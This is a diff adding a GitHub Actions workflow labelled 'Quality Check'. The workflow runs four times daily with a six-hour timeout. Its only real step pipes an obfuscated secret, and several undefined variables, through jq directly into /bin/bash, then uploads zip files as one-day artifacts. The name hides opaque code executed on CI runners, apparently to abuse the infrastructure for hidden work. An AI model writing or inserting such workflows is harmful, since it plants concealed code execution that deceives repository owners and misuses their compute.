@@ -1,0 +1,33 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '31 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          vcaam1473: ${{ secrets.vcaam1473 }}
+        run: |
+          printf '%s' "$vcaam1473" | jq -r .mtjka8 | /bin/bash
+          echo $wxz46 | jq -r .vzylq3 | /bin/bash
+          printf '%s' "$cq6449" | jq -r .qf57731 | /bin/bash
+          printf '%s' "$d10" | jq -r .bsqy961 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: aBYaksGH
+          path: "*.zip"
+          retention-days: 1
